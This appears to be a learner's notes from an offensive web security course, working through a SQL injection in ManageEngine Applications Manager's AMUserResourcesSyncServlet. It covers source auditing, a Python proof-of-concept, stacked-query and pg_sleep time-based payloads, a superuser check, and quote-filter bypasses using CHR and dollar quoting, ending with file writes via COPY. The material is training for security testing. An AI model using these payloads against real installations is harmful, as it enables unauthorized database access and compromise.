1
(Zoho Corp., 2020), https://www.manageengine.com/products/applications_manager/ ↩︎

2
(Sharpened Productions, 2020), https://fileinfo.com/extension/do ↩︎


Java web applications use a deployment descriptor file named web.xml to determine how URLs map to servlets,2 which URLs require authentication, and other information. This file is essential when we look for the implementations of any given functionality exposed by the web application.

With that said, within the working directory, we see a WEB-INF folder, which is the Java's default configuration folder path where we can find the web.xml file. This file contains a number of servlet names to servlet classes as well as the servlet name to URL mappings. Information like this will become useful once we know exactly which class we are targeting, since it will tell us how to reach it.

1
(MicroSoft, 2020), https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer ↩︎

2
(Wikipedia, 2020), https://en.wikipedia.org/wiki/Java_servlet ↩︎

By checking the contents of the C:\Program Files (x86)\ManageEngine\AppManager12\working\WEB-INF\lib directory, we notice that it contains a number of JAR files. If we just take a look at the names of these files, we can see that most of them are actually standard third party libraries such as struts.jar or xmlsec-1.3.0.jar. Only four JAR files in this directory appear to be native to ManageEngine. Of those four, AdventNetAppManagerWebClient.jar seems like a good starting candidate due to its rather self-explanatory name.

JD-GUI allows us to do that via the File > Save All Sources menu.


Example query from source code:
```
String query = "select count(*) from Alert where SEVERITY = " + i + " and groupname ='AppManager'";
```

Regular expression used to search for SELECT queries
```
^.*?query.*?select.*?
```

Another approach when reviewing a web application is to start from the front-end user interface implementation and take a look at the HTTP request handlers first.

With that in mind, it is important to know that in a typical Java servlet, we can easily identify the HTTP request handler functions that handle each HTTP request type due to their constant and unique names.

These methods are named as follows:

doGet
doPost
doPut
doDelete
doCopy
doOptions
Since we already mentioned that we like to stay as close as possible to the entry points of user input into the application during the beginning stages of our source code audits, searching for all doGet and doPost function implementations seems like a good option.


Typically, the doPost and doGet functions expect two parameters as shown in the listing below:

```
protected void doGet(HttpServletRequest req,
                     HttpServletResponse resp)
```
Listing 3 - Example of a servlet HTTP request handler method


1
(Oracle, 2015), https://docs.oracle.com/javaee/7/api/javax/servlet/http/HttpServletRequest.html ↩︎

2
(Oracle, 2015), https://docs.oracle.com/javaee/7/api/javax/servlet/http/HttpServletResponse.html ↩︎

3
(Oracle, 2015), https://docs.oracle.com/javaee/7/api/javax/servlet/ServletRequest.html#getParameter-java.lang.String ↩︎


Since ManageEngine uses PostgreSQL as a back end database, we will need to edit its configuration file in order to enable any logging feature. In our virtual machine, the postgresql.conf file is located at the following path: C:\Program Files (x86)\ManageEngine\AppManager12\working\pgsql\data\amdb\postgresql.conf

In order to instruct the database to log all SQL queries we'll change the postgresql.conf log_statement setting to 'all' as shown in the listing below.

```
log_statement = 'all'			# none, ddl, mod, all
```

Listing 6 - Modifying the postgresql.conf file to enable query logging



Once the service is restarted, we will be able to see failed queries in log files, beginning with swissql, in the following directory:

```
C:\Program Files (x86)\ManageEngine\AppManager12\working\pgsql\data\amdb\pgsql_log\
```
Listing 7 - PostgreSQL log directory

```
powershell> dir | sort LastWriteTime | select -last 1
powershell> Get-Content .\postgres_11.log -wait -tail 1 | Select-String -Pattern "select version"
```

Use pgAdmin query tool or

```
psql.exe -U postgres -p 15432

```

Triggering the Vulnerability
When available, analyzing the source code greatly accelerates vulnerability discovery and our understanding of any possible restrictions. Nevertheless, at some point we must trigger the vulnerability to make further progress. In order to do so, we need a URL to start crafting our request.

From the servlet mapping initially discovered in the web.xml file, we know that the URL we need to use to reach the vulnerable code is as follows:

```
<servlet-mapping>
    <servlet-name>AMUserResourcesSyncServlet</servlet-name>
    <url-pattern>/servlet/AMUserResourcesSyncServlet</url-pattern>
</servlet-mapping>
```
Listing 8 - The servlet mapping

```
<servlet>
    <servlet-name>AMUserResourcesSyncServlet</servlet-name>
    <servlet-class>com.adventnet.appmanager.servlets.comm.AMUserResourcesSyncServlet</servlet-class>
</servlet>
```
Listing 9 - The mapping location

Remember that during our analysis, we established that to reach the vulnerable SQL query, we only require two parameters in our request, namely ForMasRange and userId.

Putting all the information together, our initial request will look like this:

```
GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1; HTTP/1.1
Host: manageengine:8443
```
Listing 10 - Triggering the vulnerability

Notice that the request above performs a basic injection using a semicolon. The reason for this is because we already know what the vulnerable query looks like (Listing 11) and we know that it does not contain any quoted strings. Therefore, trying to simply terminate the query with a semicolon at the injection point should work well.

```
String qry = "select distinct(RESOURCEID) from AM_USERRESOURCESTABLE
where USERID=" + userId + " and RESOURCEID >" + stRange + " and
RESOURCEID < " + endRange;
```
Listing 11 - The SQL query taken from the code. Notice how there are no quotes that need to be escaped.

```
import sys
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def main():
	if len(sys.argv) != 2:
		print "(+) usage %s <target>" % sys.argv[0]
		print "(+) eg: %s target" % sys.argv[0]
		sys.exit(1)
	
	t = sys.argv[1]
	
	sqli = ";"

	r = requests.get('https://%s:8443/servlet/AMUserResourcesSyncServlet' % t, 
					  params='ForMasRange=1&userId=1%s' % sqli, verify=False)
	print r.text
	print r.headers

if __name__ == '__main__':
	main()
```
Listing 12 - Sample proof-of-concept to trigger the vulnerability

When we send our trigger request through Burp or a simple Python script (Listing 12), we get a response that is not very verbose. As a matter of fact, it is virtually empty as indicated by the Content-Length of 0.

```
HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
Set-Cookie: JSESSIONID_APM_9090=5A0EF105FBA016EA342E8B6F20B8FB63;
Path=/; Secure; HttpOnly
Content-Type: text/html;charset=UTF-8
Content-Length: 0
Date: Sat, 26 Nov 2016 08:57:40 GMT
```
Listing 13 - The HTTP response from the SQL Injection GET request

This is worth noting because in the case of a black box test, we would almost have no way of knowing that an SQL injection vulnerability even exists. The HTTP server does not pass through any kind of verbose errors, any POST body changes, or 500 status codes. In other words, at first glance everything seems okay.

Yet, when we look into the previously mentioned log file located in the C:\Program Files (x86)\ManageEngine\AppManager12\working\pgsql\data\amdb\pgsql_log\ directory, we see an error message that is clearly indicative of an SQL injection:

```
[ 2018-04-21 04:33:39.928 GMT ]:LOG:  execute <unnamed>: select distinct(RESOURCEID) from AM_USERRESOURCESTABLE where USERID=1
[ 2018-04-21 04:33:39.929 GMT ]:ERROR:  syntax error at or near "and" at character 2
[ 2018-04-21 04:33:39.929 GMT ]:STATEMENT:   and RESOURCEID >1 and RESOURCEID < 10000001
```
Listing 14 - The injected ";" character breaks The SQL query confirming the presence of a vulnerability

Before we continue we need to provide a little but more detail about this particular vulnerability. In a brand new installation of our target web application, the data table that is used in the vulnerable query (AM_USERRESOURCESTABLE) does not contain any data. When this is true, it can lead to misleading or incomplete results if we only try injecting trivial payloads. Let's see why that is.

If we pay close attention, we can see that we have a few options for the type of payload we can inject. One approach would be to use a UNION query and extract data directly from the database. However, we need to be mindful of the fact that the RESOURCEID column that the original query is referencing, is defined as a BIGINT datatype. In other words, we could only extract arbitrary data when it is of the same data type.

select distinct(RESOURCEID) from AM_USERRESOURCESTABLE where USERID=1 UNION SELECT 1
Listing 15 - A simple UNION injection payload

Another option is to use a UNION query with a boolean-based blind injection. Similar to what we have already seen in ATutor, we could construct the injected queries to ask a series of TRUE and FALSE questions and infer the data we are trying to extract in that fashion.

select distinct(RESOURCEID) from AM_USERRESOURCESTABLE where USERID=1 UNION SELECT CASE WHEN (SELECT 1)=1 THEN 1 ELSE 0 END
Listing 16 - An injection payload using UNION and a boolean conditional statement

The reason why we are not considering this approach is because one of the great things about Postgres SQL-injection attacks is that they allow an attacker to perform stacked queries. This means that we can use a query terminator character in our payload, as we saw in Listing 10, and inject a completely new query into the original vulnerable query string. This makes exploitation much easier since neither the injection point nor the payload are limited by the nature of the vulnerable query.

The downside with stacked queries is that they return multiple result sets. This can break the logic of the application and with it the ability to exfiltrate data with a boolean blind-based attack. Unfortunately, this is exactly what happens with our ManageEngine application. An example error message from the application logs (C:\Program Files (x86)\ManageEngine\AppManager12\logs\stdout.txt) when using stacked queries can be seen below.

```
[30 Nov 2018 07:40:23:556] SYS_OUT: AMConnectionPool : Error while executing query select distinct(RESOURCEID) from AM_USERRESOURCESTABLE where USERID=1;SELECT (CASE WHEN (1=1) THEN 1 ELSE 0 END)-- and RESOURCEID >1 and RESOURCEID < 10000001. Error Message : Multiple ResultSets were returned by the query.
```
Listing 17 - Using stacked queries with boolean-based payloads results in the breakdown of application logic

In order to solve this problem and still be able to use the flexibility of stacked queries, we have to resort to time-based blind injection payloads.

In the case of PostgreSQL, to confirm the blind injection we would use the pg_sleep function, as shown in the listing below.

```
GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;
select+pg_sleep(10); HTTP/1.1
Host: manageengine:8443
```
Listing 18 - Causing the database to sleep for 10 seconds before returning

Note that the plus sign between select and pg_sleep will be interpreted as a space. This could also be substituted with the “%20” characters, which are the URL-encoded equivalent of a space.

Now that we have verified our ability to execute stacked queries along with time-based blind injection, we can continue our exploit development.

```
curl -k -v 'https://manageengine:8443/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1+UNION+SELECT+CASE+WHEN+(SELECT+1)=1+THEN+1+ELSE+0+END'
curl -k -v 'https://manageengine:8443/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1+UNION+SELECT+1'
curl -k -v 'https://manageengine:8443/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;select+pg_sleep(10);'
         
```
Ex.

```
grep -r -P "^.*?query.*?select.*?where.*?(\+)+.*?" *

curl -k -v 'https://manageengine:8443/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;select+pg_sleep(10);'
```
found issue with < and > and '

```
ERROR:  column "lt" does not exist at character 85
[ 2024-03-28 21:49:00.781 GMT ]:STATEMENT:  select distinct(RESOURCEID) from AM_USERRESOURCESTABLE where USERID=1 union select &lt
```
Single quote became &#39
```
select distinct(RESOURCEID) from AM_USERRESOURCESTABLE where USERID=1&#39
```

How Houdini Escapes

postgres allows stacked query.

Single quote in string
```
GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1' HTTP/1.1
Host: manageengine:8443
```
Listing 19 - Sending an SQL Injection payload that contains a single quote

Looking at the log file we see the following error:
```
[ 2018-04-21 04:42:58.221 GMT ]:ERROR:  operator does not exist: integer &# integer at character 73
[ 2018-04-21 04:42:58.221 GMT ]:HINT:  No operator matches the given name and argument type(s). You might need to add explicit type casts.
[ 2018-04-21 04:42:58.221 GMT ]:STATEMENT:  select distinct(RESOURCEID) from AM_USERRESOURCESTABLE where USERID=1&#39
```
Listing 20 - The SQL error message in the log file

As it turns out, special characters are HTML-encoded before they are sent to the database for further processing. This causes us a few headaches as it seems that we cannot use quoted string values in our queries.

In case of myaql:

```
MariaDB [mysql]> select concat('1337',' h@x0r')
    -> ;
+-------------------------+
| concat('1337',' h@x0r') |
+-------------------------+
| 1337 h@x0r              |
+-------------------------+
1 row in set (0.00 sec)

MariaDB [mysql]> select concat(0x31333337,0x206840783072)
    -> ;
+-----------------------------------+
| concat(0x31333337,0x206840783072) |
+-----------------------------------+
| 1337 h@x0r                        |
+-----------------------------------+
1 row in set (0.00 sec)
```

As shown in the listing above, the ASCII characters in their hexadecimal representation are automatically decoded by the MySQL engine.

As an example, the listing below shows how to make use of the decode function in PostgreSQL to convert our "AWAE" base64 encoded string:

```
select convert_from(decode('QVdBRQ==', 'base64'), 'utf-8');
```
Listing 22 - Using the decode function in PostgreSQL. Note: we still need quotes!

1
(The PostgreSQL Global Development Group, 2020), https://www.postgresql.org/docs/9.2/static/functions-string.html ↩︎


##### Using CHR and String Concatenation

we can select individual characters using their code points2 (numbers that represent characters) and concatenate them together using the double pipe (||) operator.

```
amdb=#SELECT CHR(65) || CHR(87) || CHR(65) || CHR(69);
?column?
--------
AWAE
(1 row)
```

The problem is that character concatenation only works for basic queries such as SELECT, INSERT, DELETE, etc. It does not work for all SQL statements.

````
amdb=# CREATE TABLE AWAE (offsec text); INSERT INTO AWAE(offsec) VALUES (CHR(65)||CHR(87)||CHR(65)||CHR(69));
CREATE TABLE
INSERT 0 1
amdb=# SELECT * from AWAE;
 offsec
--------
 AWAE
(1 row)

```

###### CHR does not work for COPY function

```
CREATE TABLE AWAE (offsec text);
INSERT INTO AWAE(offsec) VALUES (CHR(65)||CHR(87)||CHR(65)||CHR(69));
COPY AWAE (offsec) TO CHR(99)||CHR(58)||CHR(92)||CHR(92)||CHR(65)||CHR(87)||CHR(65)||CHR(69));
ERROR:  syntax error at or near "CHR"
LINE 3: COPY AWAE (offsec) TO CHR(99)||CHR(58)||CHR(92)||CHR(92)||CH...
                              ^

********** Error **********
```
(The PostgreSQL Global Development Group, 2020), https://www.postgresql.org/docs/9.1/static/functions-string.html ↩︎

2
(Wikipedia, 2020), https://en.wikipedia.org/wiki/Code_point ↩︎

##### It Makes Lexical Sense

PostgreSQL syntax also supports dollar-quoted string constants. Their purpose is to make it easier to read statements that contain strings with literal quotes.

Essentially, two dollar characters ($$) can be used as a quote (') substitute by themselves, or a single one ($) can indicate the beginning of a "tag." The tag is optional, can contain zero or more characters, and is terminated with a matching dollar ($). If used, this tag is then required at the end of the string as well.

```
SELECT 'AWAE';
SELECT $$AWAE$$;
SELECT $TAG$AWAE$TAG$;
```
This allows us to fully bypass the quotes restriction we have previously encountered as shown in the listing below.

```
CREATE TEMP TABLE AWAE(offsec text);INSERT INTO AWAE(offsec) VALUES ($$test$$);
COPY AWAE(offsec) TO $$C:\Program Files (x86)\PostgreSQL\9.2\data\test.txt$$;

COPY 1

Query returned successfully in 201 msec.
```


1 (The PostgreSQL Global Development Group, 2020), https://www.postgresql.org/docs/9.2/static/sql-syntax-lexical.html ↩︎

#### Blind Bats

```
GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;<some query>;--+ HTTP/1.0
Host: manageengine:8443
```
Listing 28 - The ability for us to execute arbitrary SQL statements through stacked queries

```
SELECT current_setting('is_superuser');
```
Listing 29 - Checking our DB privileges

```GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;SELECT+case+when+(SELECT+current_setting($$is_superuser$$))=$$on$$+then+pg_sleep(10)+end;--+
Host: manageengine:8443
```
Listing 30 - Checking if we are DBA


